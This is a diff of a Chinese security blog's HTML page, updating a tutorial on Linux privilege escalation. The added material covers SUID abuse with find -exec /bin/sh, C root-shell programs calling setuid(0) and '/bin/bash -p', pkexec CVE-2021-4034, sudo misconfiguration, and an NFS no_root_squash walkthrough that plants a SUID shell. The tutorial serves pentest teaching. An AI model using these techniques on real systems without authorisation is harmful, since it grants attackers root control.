@@ -454,21 +454,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-04-27
+                    2022-05-08
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.9k
+                    3.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    11 分
+                    13 分
                 </div>
                 
 
@@ -626,6 +626,11 @@ fg  将后台中的命令调至前台继续运行<span aria-hidden="true" class=
 </li>
 </ol>
 <h2 id="利用SUID提权"><a href="#利用SUID提权" class="headerlink" title="利用SUID提权"></a><strong>利用SUID提权</strong></h2><p>SUID是一种特殊权限，可以让调用者在执行过程中暂时获得该文件拥有者的权限。如果可以找到并运行root用户所拥有的SUID的文件，那么就可以在运行该文件的时候获得root用户权限。</p>
+<h4 id="SUID权限"><a href="#SUID权限" class="headerlink" title="SUID权限"></a><strong>SUID权限</strong></h4><p>1，SUID权限只能设置二进制文件。</p>
+<p>2，命令执行者要有二进制文件的执行权。</p>
+<p>3，命令执行者执行二进制文件时会获得该程序的属主身份。</p>
+<p>4，SUID权限只在程序执行过程中有效。</p>
+<p>即如果root给一个程序赋予了SUID权限，则普通用户在执行该程序过程中，是root权限。</p>
 <p>查看find命令权限</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1. 查看find命令位置</span>
 <span class="token function">which</span> <span class="token function">find</span>
@@ -641,9 +646,9 @@ fg  将后台中的命令调至前台继续运行<span aria-hidden="true" class=
 <span class="token function">find</span> / -user root -perm -4000-print<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null<span class="token punctuation">;</span>
 <span class="token function">find</span> / -user root -perm -4000-exec <span class="token function">ls</span> -ldb <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">\</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> 路径 -exec <span class="token function">whoami</span> <span class="token punctuation">\</span><span class="token punctuation">;</span>
-<span class="token comment">#路径为搜到的文件路径</span>
-<span class="token comment">#find  (一个路径或文件必须存在)  -exec  执行命令 （结束）\;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>常用的可用于suid提权的文件<br>Nmap、Vim、find、Bash、More、Less、cp</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">文件 路径 -exec <span class="token string">"/bin/sh"</span> <span class="token punctuation">\</span><span class="token punctuation">;</span>
+<span class="token comment">#find  (一个路径，你用find找到具有root用户权限的SUID的文件)  -exec  执行命令 （结束）\;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>msf中的模块为：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">exploit/unix/local/setuid_nmap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -660,8 +665,13 @@ fg  将后台中的命令调至前台继续运行<span aria-hidden="true" class=
 <span class="token punctuation">{</span>
     <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ps"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ps"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//可以是其他命令</span>
+<span class="token punctuation">}</span>
+<span class="token comment">//或者</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash -p"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//编译后，将生成一个以root身份运行的Bash shell</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>然后使用gcc编译demo.c文件，并提升编译文件的SUID权限并执行。</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc demo.c -o shell
@@ -684,6 +694,44 @@ fg  将后台中的命令调至前台继续运行<span aria-hidden="true" class=
 ./shell
 <span class="token function">whoami</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+
+
+<h2 id="CVE-2021-4034"><a href="#CVE-2021-4034" class="headerlink" title="CVE-2021-4034"></a>CVE-2021-4034</h2><p>Linux提权漏洞，主要原因在于Polkit包下的Pkexec工具存在内存损害，允许非特权用户利用提升到ROOT。</p>
+<p>Pkexec是系统预装的工具，所以主流的都会受到影响，像Ubuntu、Debian、Fedora、Centos等，从2009年起所有的Pkexec都会受到攻击，下面以Ubuntu20.04为例。</p>
+<p>直接Github搜EXP。</p>
+<p>临时防护，从Pkexec中删除Suid，先取消该工具的临时高权限功能。</p>
+<h2 id="利用sudo进行linux提权"><a href="#利用sudo进行linux提权" class="headerlink" title="利用sudo进行linux提权"></a>利用sudo进行linux提权</h2><p>当没有对普通用户做严格的限制时，或者配置权限过大时，则可以尝试sudo su来切换到root权限。或者执行sudo bash。</p>
+<p>sudo vim也可以编辑sudoers文件，且wq!可以成功保存。但要查看一下vim是否被禁用。</p>
+<h2 id="NFS配置不当导致的Linux提权"><a href="#NFS配置不当导致的Linux提权" class="headerlink" title="NFS配置不当导致的Linux提权"></a>NFS配置不当导致的Linux提权</h2><p>NFS是network file system缩写，网络文件系统，用来挂在某个目录或文件进行共享，默认是2049端口，功能类似于windows的共享。</p>
+<p>当nfs配置了读写权限，且允许客户端以root访问时，就会存在安全隐患。</p>
+<p>被攻击机：</p>
+<p>首先安装nfs服务端：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> nfs-kernel-server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>安装后修改配置文件/etc/exports，这里将home目录进行挂载共享，内容如下：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/home *<span class="token punctuation">(</span>rw,no_root_squash<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>其中/home是要挂载的目录，*代表允许连接的主机，这里是所有，rw是读写权限，no_root_squash代表客户端允许以root权限访问nfs。</p>
+<p>攻击机：</p>
+<p>首先在攻击机上安装连接所需的基础组件</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> nfs-common cifs-utils<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>创建目录以挂载远程系统。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /nfs_client<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后输入命令</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">showmount -e <span class="token punctuation">[</span>IP地址<span class="token punctuation">]</span>:<span class="token punctuation">[</span>远程挂载地址<span class="token punctuation">]</span> <span class="token punctuation">[</span>本地挂载地址<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>简单写一个提权程序</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }'</span> <span class="token operator">&gt;</span> /nfs_client/suid-shell.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>编译</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc /nfs_client/suid-shell.c -o /nfs_client/suid-shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>赋权</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +s /nfs_client/suid-shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后回到要提权的服务器上以低权限运行suid-shell</p>
 
                 
             </div>
@@ -1194,18 +1242,18 @@ fg  将后台中的命令调至前台继续运行<span aria-hidden="true" class=
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/04/25/shen-tou-xiao-tips-qi/">
+                <a href="/2022/04/25/redis-an-quan/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/69.jpg" class="responsive-img" alt="渗透小tips（七）">
+                        <img src="/medias/featureimages/69.jpg" class="responsive-img" alt="浅析redis安全">
                         
-                        <span class="card-title">渗透小tips（七）</span>
+                        <span class="card-title">浅析redis安全</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            序列化和反序列化
+                            redis安全
                         
                     </div>
                     <div class="publish-info">
@@ -1231,8 +1279,8 @@ fg  将后台中的命令调至前台继续运行<span aria-hidden="true" class=
                         <span class="chip bg-color">渗透测试</span>
                     </a>
                     
-                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">web安全</span>
+                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">内网渗透</span>
                     </a>
                     
                 </div>
